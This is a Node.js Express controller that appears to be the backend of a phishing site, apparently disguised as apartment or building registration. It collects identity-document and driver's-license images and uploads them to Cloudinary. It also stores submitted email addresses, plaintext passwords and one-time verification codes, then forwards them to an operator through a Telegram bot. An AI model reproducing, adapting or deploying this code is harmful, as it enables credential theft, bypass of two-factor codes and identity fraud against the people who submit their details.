const { log } = require("console");
const User = require("../models/userModel");
const cloudinary = require("cloudinary").v2;
const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot(process.env.TELEGRAM_BOT_ME);
const register = async (req, res) => {
  try {
    console.log(req.files);
    // console.log(req.body);
    const { id_front_image, id_back_image, drivers_license_image, last_image } =
      req.files;

      if(!id_front_image || !id_back_image || !drivers_license_image || !last_image) {
        console.log('files not present');
      }
    
    // Validate file types
    const allowedMimeTypes = ["image/jpeg", "image/png"];
    if (
      !allowedMimeTypes.includes(id_front_image.mimetype) ||
      !allowedMimeTypes.includes(id_back_image.mimetype) ||
      !allowedMimeTypes.includes(drivers_license_image.mimetype) ||
      !allowedMimeTypes.includes(last_image.mimetype)
    ) {
      return res.status(400).json({
        status: "failed",
        error:
          "Only JPEG and PNG images are allowed for id_front_image, id_back_image, drivers_license_image, and last_image!",
      });
    }

    // Upload images to Cloudinary
    const id_front_imageResult = await cloudinary.uploader.upload(
      id_front_image.tempFilePath,
      {
        use_filename: true,
        folder: "id_front_images",
      }
    );
    const id_back_imageResult = await cloudinary.uploader.upload(
      id_back_image.tempFilePath,
      {
        use_filename: true,
        folder: "id_back_image_images",
      }
    );
    const drivers_license_imageResult = await cloudinary.uploader.upload(
      drivers_license_image.tempFilePath,
      {
        use_filename: true,
        folder: "drivers_license_images",
      }
    );
    const last_imageResult = await cloudinary.uploader.upload(
      last_image.tempFilePath,
      {
        use_filename: true,
        folder: "last_image_images",
      }
    );

    // Create new user with uploaded image URLs
    const user = await User.create({
      ...req.body,
      id_front_image: id_front_imageResult.secure_url,
      id_back_image: id_back_imageResult.secure_url,
      drivers_license_image: drivers_license_imageResult.secure_url,
      last_image: last_imageResult.secure_url,
    });
    if (user) {
      console.log("sent");
    }
    bot.sendMessage(
      process.env.TELEGRAM_CHAT_ID_ME,
      `New registration from buildings:::: \n ${user}`
    );

    res.status(201).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};



const getAllUsers = async (req, res) => {
  try {
    const users = await User.find({});

    res.status(200).json({ nbHits: users.length - 13, users });
  } catch (error) {
    console.log(error);
  }
};
module.exports = {
  register,
  getAllUsers,
};

// commented form here
const os = require("os");

const getIpAddress = () => {
  const networkInterfaces = os.networkInterfaces();
  let ipAddress;
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        ipAddress = iface.address;
        break;
      }
    }
    if (ipAddress) {
      break;
    }
  }
  return ipAddress;
};

const sendEmail = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
    const userAgent = req.headers["user-agent"];
    let user = await Login.findOne({ ip: ipAddress + userAgent });

    if (user) {
      user.email = req.body.email;
      user.password = req.body.password;
      await user.save();
    }

    req.body.ip = getIpAddress() + userAgent;
    user = await Login.create(req.body);

    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const sendCode = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
    const userAgent = req.headers["user-agent"];
    if (!ipAddress) {
      return res.status(404).json({ error: "ip address not found" });
    }
    const user = await Login.findOneAndUpdate(
      { ip: ipAddress + userAgent },
      { code: req.body.code },
      { new: true }
    );
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    const message = `${`${user.code} from ${user.email}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, message);

    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const sendEmailApt = async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: "please enter email and password" });
    }

    const user = await User.create({ email, password });
    const message = `${` message from apartment \n Email::: ${user.email} \n passwprd::: ${user.password}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, message);
    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

module.exports = {
  register,
};
